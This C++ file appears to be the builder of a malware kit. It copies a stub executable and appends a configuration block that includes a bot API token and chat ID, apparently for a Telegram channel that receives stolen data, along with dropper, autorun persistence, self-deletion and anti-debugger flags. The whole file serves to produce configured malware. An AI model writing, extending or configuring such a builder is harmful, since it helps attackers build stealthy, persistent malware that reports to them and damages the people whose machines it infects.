#include "Builder.h"

BOOL MakeFile(const char* stub, const char* output, Settings* s) {
	std::ifstream f_stub(stub, std::ifstream::binary);
	std::ofstream f_out(output, std::ofstream::binary);

	if (!f_stub.is_open() ||
		!f_out.is_open()) {
		return FALSE;
	}

	f_out << f_stub.rdbuf();
	f_stub.close();

	f_out.write((char*)&s->botapi, sizeof(s->botapi));
	f_out.write((char*)&s->chatid, sizeof(s->chatid));
	f_out.write((char*)&s->drop, sizeof(s->drop));
	f_out.write((char*)&s->client_delay, sizeof(s->client_delay));
	f_out.write((char*)&s->autorun, sizeof(s->autorun));
	f_out.write((char*)&s->auto_delete, sizeof(bool));
	f_out.write((char*)&s->autorun_state, sizeof(bool));
	f_out.write((char*)&s->drop_run, sizeof(bool));
	f_out.write((char*)&s->protect_debuggers, sizeof(bool));

	f_out.close();

	return TRUE;
}
